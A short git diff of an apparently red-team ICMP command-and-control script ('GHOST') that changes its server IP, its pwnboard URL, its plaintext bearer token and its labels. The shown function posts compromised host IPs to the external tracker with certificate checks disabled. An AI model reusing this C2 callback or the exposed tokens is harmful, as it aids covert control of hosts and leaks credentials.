@@ -13,11 +13,11 @@ from scapy.packet import Raw
 from scapy.sendrecv import send, AsyncSniffer
 
 
-SERVER_IP = "192.168.10.170"
+SERVER_IP = "192.168.10.168"
 
-PWNBOARD_URL  = "https://pwnboard.win/pwn"
-BEARER_TOKEN  = "E9Loq-pQR7P545vRwPZBXs3oxJS3vHeA4IJ79_TW0v0"
-APP_NAME      = "ghostping"
+PWNBOARD_URL  = "https://pwn.salsas.bar/"
+BEARER_TOKEN  = "1lsdnOrqqLyg06q5CIApePq4K7evMTz4W9FO0uXfKsM"
+APP_NAME      = "GHOST"
 TIMEOUT       = 5
 
 def pwnboard_callback(ip):
@@ -28,7 +28,7 @@ def pwnboard_callback(ip):
     payload = {
         "ip": ip,
         "application": APP_NAME,
-        "access_type": "icmp c2",
+        "access_type": "ICMP C2",
     }
     try:
         r = requests.post(PWNBOARD_URL, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
